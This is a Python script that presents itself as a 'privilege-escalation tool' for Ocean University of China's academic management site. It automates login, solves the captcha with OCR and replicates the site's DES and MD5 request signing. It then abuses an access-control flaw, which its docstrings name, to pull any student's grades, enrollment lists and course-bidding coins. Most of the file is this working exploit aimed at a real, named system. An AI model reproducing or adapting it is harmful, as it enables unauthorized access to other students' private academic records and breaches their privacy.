# -*- coding:utf-8 -*-
from bs4 import BeautifulSoup
import json
import requests
import base64
import hashlib
import string
from PIL import Image
import pytesseract
import os
import logging
import sys
from prettytable import PrettyTable

import des_enc

xn = ''
xnxq = ''
user_agent = '''Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'''

logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s %(message)s',
                    datefmt='%Y-%m-%d %H:%M:%S',
                    stream=sys.stdout)


class Login:
    def __init__(self, username, password_md5, validate_code_len=4):
        self.valicode_code_num = 0  # 记录失败的验证码数量
        self.validate_code_len = validate_code_len  # 验证码的长度
        self.username = username
        self.password_md5 = password_md5

        self.index_url = 'http://jwgl.ouc.edu.cn/cas/login.action'
        self.login_url = 'http://jwgl.ouc.edu.cn/cas/logon.action'
        self.headers = {
            'User-Agent': user_agent
        }
        self.session = requests.Session()
        self.session.get(self.index_url, headers=self.headers)

    def _image_to_text(self, filename):
        '''
        使用pytesseract模块
        1000次验证码数据测试正确率
            1. 直接使用pyteeseract 29.24%
            2. 将图片转为灰度图像    30.46%
            3. 灰度图像，再进行二值化，阈值为100 15.78%
        '''
        if os.name == 'nt':
            pytesseract.pytesseract.tesseract_cmd = "C:\\Program Files (x86)\\Tesseract-OCR\\tesseract.exe"
        im = Image.open(filename)
        # im = im.convert("L")
        #
        # threshold = 100
        # table = []
        # for i in range(256):
        #     if i < threshold:
        #         table.append(0)
        #     else:
        #         table.append(1)
        # im = im.point(table, "1")

        try:
            text = pytesseract.image_to_string(im)
            return text
        except:
            pass
        return ''

    def _get_validate_code(self):
        """
        验证码识别结果处理机制：
            1. 先去除一些由于验证码识别错误而导致的特殊字符
            2. 验证识别结果是不是四个字符
            两个条件符合在进行登陆
        这里为了减少用错误的验证码去登陆教务系统的次数从而减少登陆时间
        """
        while True:
            wrong_chars = ' _-+|.:\';\n\t\r'
            correct_chars = string.ascii_lowercase + string.digits

            validate_url = 'http://jwgl.ouc.edu.cn/cas/genValidateCode'
            r = self.session.get(validate_url, headers=self.headers)
            f = open('temp.png', 'wb')
            f.write(r.content)
            f.close()
            validate_code = self._image_to_text('temp.png')
            # os.remove('temp.png')
            validate_code = validate_code.lower()
            logging.info('Get validate_code:' + validate_code)
            self.valicode_code_num = self.valicode_code_num + 1
            """
            由于无法确定验证码的准确性，所以当输入错误的用户名或者密码时，我们无法验证是什么原因导致的登陆失败
            这里我们认定当获得20次验证码后还未成功，就默认用户名或者密码错误
            """
            if self.valicode_code_num >= 20:
                return False

            for c in wrong_chars:
                validate_code = validate_code.replace(c, '')
            if len(validate_code) == self.validate_code_len:
                for i in validate_code:
                    if i not in correct_chars:
                        continue
                return validate_code

    def login(self, validate_code):
        headers = {
            'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': user_agent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': 'http://jwgl.ouc.edu.cn/cas/login.action',
            'Accept': 'text/plain, */*; q=0.01',
            'Origin': 'http://jwgl.ouc.edu.cn'
        }
        sessionid = self.session.cookies['JSESSIONID']
        rand_number = validate_code  # 验证码
        password_policy = '1'
        p_username = '_u' + rand_number
        p_password = '_p' + rand_number

        password = hashlib.md5(
            (self.password_md5 + (hashlib.md5(rand_number.lower().encode('utf-8'))).hexdigest()).encode(
                'utf-8')).hexdigest()
        username = base64.b64encode((self.username + ";;" + sessionid).encode('utf-8')).decode('utf-8')
        data = {
            p_username: username,
            p_password: password,
            'randnumber': rand_number,
            'isPasswordPolicy': password_policy
        }
        # proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
        try:
            # self.session.post(self.login_url, headers=headers, data=data, proxies=proxies)
            self.session.post(self.login_url, headers=headers, data=data)
            r = self.session.get('http://jwgl.ouc.edu.cn/MainFrm.html', allow_redirects=False)
            logging.info('Get HTTP statue_code:' + str(r.status_code))
            if r.status_code == 200:
                logging.info('Get Validate_code accuracy: ' + str(round(100 / self.valicode_code_num, 2)) + '%')
                logging.info('Get validated cookie: ' + str(self.session.cookies.get_dict()))
                return True
        except Exception as e:
            logging.error(e)
            logging.error('Something wrong!')

        return False

    def get_cookies(self):
        while True:
            code = self._get_validate_code()
            if code:
                if self.login(code):
                    return self.session.cookies
            else:
                logging.error('请确认账户密码正确')
                sys.exit(1)
    # def test(self, num):
    #     flag = 0
    #     while True:
    #         logging.info(self.valicode_code_num)
    #         if self.valicode_code_num > num:
    #             break
    #         if self.login(self._get_validate_code()):
    #             flag = flag + 1
    #
    #     logging.info(str(flag / self.valicode_code_num))


class Data:
    def __init__(self, cookies):
        self.cookies = cookies

    def get_grades(self, username):
        """
        此操作具有越权漏洞
        :param username: 学号
        :return: json数据
        """
        grades_url = 'http://jwgl.ouc.edu.cn/student/xscj.stuckcj_data.jsp'
        headers = {
            'User-Agent': user_agent,
            'Referer': 'http://jwgl.ouc.edu.cn/student/xscj.stuckcj.jsp?menucode=JW130705'
        }
        params = f'xn={xn}&xn1={xn}&xq=1&ysyx=yscj&sjxz=sjxz1&userCode={username}&ysyxS=on&sjxzS=on'
        encrypt_url = 'http://jwgl.ouc.edu.cn/custom/js/SetKingoEncypt.jsp'
        r = requests.get(encrypt_url, headers=headers, cookies=self.cookies)
        des_key = r.text.split(';')[0].split('\'')[1]
        timestamp = r.text.split(';')[1].split('\'')[1]
        token = hashlib.md5(((hashlib.md5(params.encode('utf-8'))).hexdigest() + (
            hashlib.md5(timestamp.encode('utf-8'))).hexdigest()).encode('utf-8')).hexdigest()
        params = base64.b64encode(
            (des_enc.utf16to8((des_enc.desEnc(params, des_key, None, None)))).encode('utf-8')).decode('utf-8')
        r = requests.get(grades_url, headers=headers, params={'params': params, 'token': token, 'timestamp': timestamp},
                         cookies=self.cookies)
        if r.status_code == 200:
            logging.info('get grades!')
            soup = BeautifulSoup(r.text, 'html.parser')

            # 分析数据
            all_course_grades = []
            tables = soup.body.findAll('table')
            for table in tables:
                if table.tbody:  # 异常处理很重要
                    tbody = table.tbody
                    trs = tbody.findAll('tr')
                    for tr in trs:
                        tds = tr.findAll('td')
                        course_name = tds[1].getText().split(']')[1]
                        course_credit = tds[2].getText()
                        course_grade = tds[6].getText()

                        all_course_grades.append([course_name, course_credit, course_grade])
            # json_data = json.dumps(all_course_grades, ensure_ascii=False)  # 不使用ascii编码，中文就能显示
            return all_course_grades
        return False

    def get_select_course(self, username):
        """
        通过越权漏洞，构造利用链，获取选课情况
        """
        url = 'http://jwgl.ouc.edu.cn/taglib/DataTable.jsp?tableId=6093'
        headers = {
            'User-Agent': user_agent,
            'Referer': 'http://jwgl.ouc.edu.cn/student/wsxk.axkhksxk.html?menucode=JW130410'
        }
        data = {
            'electiveCourseForm.xktype': '2',
            'electiveCourseForm.xn': '',
            'electiveCourseForm.xq': '',
            'electiveCourseForm.xh': '',
            'electiveCourseForm.nj': '2016',
            'electiveCourseForm.zydm': '0096',
            'xqdm': '2',
            'electiveCourseForm.kcdm': '',
            'electiveCourseForm.kclb1': '',
            'electiveCourseForm.kclb2': '',
            'electiveCourseForm.khfs': '',
            'electiveCourseForm.skbjdm': '',
            'electiveCourseForm.xf': '',
            'electiveCourseForm.is_buy_book': '',
            'electiveCourseForm.is_cx': '',
            'electiveCourseForm.is_yxtj': '',
            'electiveCourseForm.xk_points': '',
            'xn': xn,
            'xn1': '',
            '_xq': '',
            'xq_m': '0',
            'xq': '0',
            'xh': username,
            'kcdm': '',
            'zc': '',
            'electiveCourseForm.xkdetails': '',
            'hidOption': '',
            'xkh': '',
            'kcmc': '',
            'kcxf': '',
            'kkxq': '',
            'kcrkjs': '',
            'skfs': '',
            'xxyx': '',
            'sksj': '',
            'skdd': '',
            'point_total': '100',
            'point_used': '100',
            'point_canused': '0',
            'text_weight': '0',
            'ck_gmjc': 'on',
            'ck_skbtj': 'on'
        }
        try:
            r = requests.post(url, headers=headers, data=data, cookies=self.cookies)
            soup = BeautifulSoup(r.text, 'html.parser')
            tbody = soup.body.table.tbody
            trs = tbody.findAll('tr')
            course_list = []
            for tr in trs:
                tds = tr.findAll('td')
                course_name = tds[1].getText().split(']')[1]
                course_id = tds[6].getText()
                course_teacher = tds[7].getText()
                money = tds[8].getText()
                course_list.append([course_name, course_id, course_teacher, money])
        except:
            logging.Error('Something wrong!')

        return course_list

    def get_select_username_by_course_id(self, course_id):
        url = 'http://jwgl.ouc.edu.cn/taglib/DataTable.jsp?tableId=3241&type=skbjdm'
        headers = {
            'User-Agent': user_agent,
            'Referer': 'http://jwgl.ouc.edu.cn/common/popmsg/popmsg.sendOnlineMessage.jsp'
        }
        data = {
            'hidOption': '',
            'hidKey': '',
            'userId': '',
            'roletype': '',
            'jsrdm': '',
            'jsrmc': '',
            'nj': xn,
            'yhdm': '',
            'emptyFlag': '0',
            'xm': '',
            'xn': '',
            'xq': '',
            'style': 'SKBJDM',
            'bmdm': '',
            'gradeController': 'on',
            'nj2': xn,
            'yxbdm': '',
            'sel_role': 'ADM000',
            'xnxq': xnxq,
            'sel_skbjdm': course_id,
            'queryInfo': '',
            '_xxbt': '',
            'xxbt': '',
            '_xxnr': '',
            'xxnr': '',
            'fjmc': ''
        }
        r = requests.post(url, headers=headers, data=data, cookies=self.cookies)
        soup = BeautifulSoup(r.text, 'html.parser')
        tbody = soup.body.table.tbody
        trs = tbody.findAll('tr')
        username_list = []
        for tr in trs:
            tds = tr.findAll('td')
            username_list.append([tds[1].getText(), tds[2].getText()])
        return username_list

    def get_money_list_by_course_id(self, course_id):
        users = self.get_select_username_by_course_id(course_id)
        info = []
        for u in users:
            courses = self.get_select_course(u[0])
            for c in courses:
                if c[1] == course_id:
                    info.append([u[1], int(c[3])])
        info.sort(key=lambda m: m[1], reverse=True)
        return info

    def get_all_select_course_money_info_by_username(self, username):
        info = []
        my_course = self.get_select_course(username)
        logging.info('Get all selected courses')
        for course in my_course:
            money = self.get_money_list_by_course_id(course[1])
            money.sort(key=lambda m: m[1], reverse=True)
            info.append([[course[0], str(course[3])], money])  # [['课程', '本人投币'],['其他人', '投币']]
        return info


def print_data_table(data_list, table_type):
    if table_type == 'gamble-username':
        for i in range(0, len(data_list)):
            table = PrettyTable(["姓名", "投币"])
            print('*****************************************')
            print(f'     {data_list[i][0][0]:^}  Gabmble  {data_list[i][0][1]:^3}')
            print('Other students\' info:')
            for j in data_list[i][1]:
                table.add_row(j)
            print(table)
            print(f'[+] 共{len(data_list[i][1])}人选此课')
            table.clear()
    else:
        if table_type == 'gamble-course':
            table = PrettyTable(["姓名", "投币"])
            print('*********************************')
            print(f'[+] 共{len(data_list)}人选此课')
        if table_type == 'grades':
            table = PrettyTable(['课程', '学分', '成绩'])
        for d in data_list:
            table.add_row(d)
        print(table)


def gen_config_file():
    logging.info('Please input your student number and password for the first time.')
    while True:
        username = input('Input student number: ').strip()
        password = input('Input password: ').strip()
        if username.isdigit() and password != '':
            break
        else:
            logging.error('Wrong format')
    config = {'username': username, 'password_md5': hashlib.md5(password.encode('utf-8')).hexdigest()}
    json_data = json.dumps(config)
    try:
        with open('config.json', 'w') as f:
            f.write(json_data)
    except Exception as e:
        logging.error(f'Something wrong!{e}')


def load_config_file():
    logging.info('Loading config.json...')
    with open('config.json', 'r') as f:
        try:
            config = json.loads(f.read())
        except:
            loggin.error('文件加载失败，请尝试删除congfig.json，重新运行')
    username = config['username']
    password = config['password_md5']
    return username, password


def main():
    help_doc = '''
            OUC教务管理系统越权小工具
功能:
    1. 查任何同学的成绩
    2. 选课专用
        2-1. 根据选课号查询选此课的人投的选课币
        2-2. 根据学号查询所有此学号的选课信息（包含2-1功能）
用法：
    1. 
        python ouc-jwgl.py grades [username]
        eg. python ouc-jwgl.py grades 16020000000 
        # 学号16020000000成绩
    2-1. 
        python ouc-jwgl.py gamble_course [course_id] [year] [semester]
        eg. python ouc-jwgl.py gamble_course 02003008 2019 2019-0
        # 2019夏季学期选课号为02003008的选课情况 0-夏季学期 1-秋季学期 2-春季学期
    2-2.
        python ouc-jwgl.py gamble_username [username] [year] [semester]
        eg. python. ouc-jwgl.py gamble_username 16020030000 2019 2019-0
        # 2019夏季学期学号为16020030000的选课情况
    '''
    if os.path.exists('config.json'):
        username, password_md5 = load_config_file()
    else:
        gen_config_file()
        print(help_doc)
        print('保存数据成功，请按照帮助文档重新运行脚本，正确输入参数')
        sys.exit(1)
    logging.info('Logining....')
    user = Login(username, password_md5)
    data = Data(user.get_cookies())
    logging.info('Logining success!')
    global xn, xnxq
    try:
        if sys.argv[1] == 'grades':
            print_data_table(data.get_grades(sys.argv[2]), 'grades')
        elif sys.argv[1] == 'gamble_course':
            xn = sys.argv[3]
            xnxq = sys.argv[4]
            print_data_table(data.get_money_list_by_course_id(sys.argv[2]), 'gamble-course')
        elif sys.argv[1] == 'gamble_username':
            xn = sys.argv[3]
            xnxq = sys.argv[4]
            print_data_table(data.get_all_select_course_money_info_by_username(sys.argv[2]), 'gamble-username')
        else:
            logging.warning('请确认输入参数按照规范')
            print(help_doc)
    except Exception as e:
        logging.error(f'Something wrong! {e}')


if __name__ == '__main__':
    main()
